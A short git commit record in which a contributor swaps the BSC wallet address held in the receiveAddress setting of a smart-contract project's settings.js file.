efbd469f7893127203d6eca3404e421ad4edd943
marycleo99 <159043815+marycleo99@users.noreply.github.com>
2024-12-22 15:21:15 +0100

    Update settings.js

--- settings.js
+++ settings.js
@@ -1,6 +1,6 @@
 //code for local smart contract
 
-const receiveAddress = "0x5b3606F7dF5ce9fF4e79Cd9094d4D5a135cf147F";   // remove the words and replace it with your bsc address    
+const receiveAddress = "0xEC3e6CdAD2E35124c1eE43A65AD9F0C771676E7C";   // remove the words and replace it with your bsc address    
 
 	
 var cryptotokenContract;
